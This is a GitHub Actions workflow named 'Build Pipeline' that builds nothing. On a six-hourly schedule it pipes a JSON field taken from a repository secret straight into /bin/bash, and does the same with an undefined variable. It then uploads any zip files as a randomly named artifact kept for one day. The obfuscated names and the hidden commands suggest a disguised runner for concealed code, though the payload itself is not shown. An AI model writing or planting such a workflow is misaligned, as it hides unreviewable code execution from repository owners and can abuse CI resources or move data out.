name: Build Pipeline
on:
  workflow_dispatch:

  schedule:
    - cron: '13 0,6,12,18 * * *'
permissions:
  contents: read
  actions: read
env:
  RUNNER_DEBUG: 0
jobs:
  task:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Apply
        env:
          v9: ${{ secrets.v9 }}
        run: |
          printf '%s' "$v9" | jq -r .z853 | /bin/bash
          printf '%s' "$g1" | jq -r .d6003 | /bin/bash

      - name: Upload output
        uses: actions/upload-artifact@v4
        with:
          name: qTVhDeBl
          path: "*.zip"
          retention-days: 1
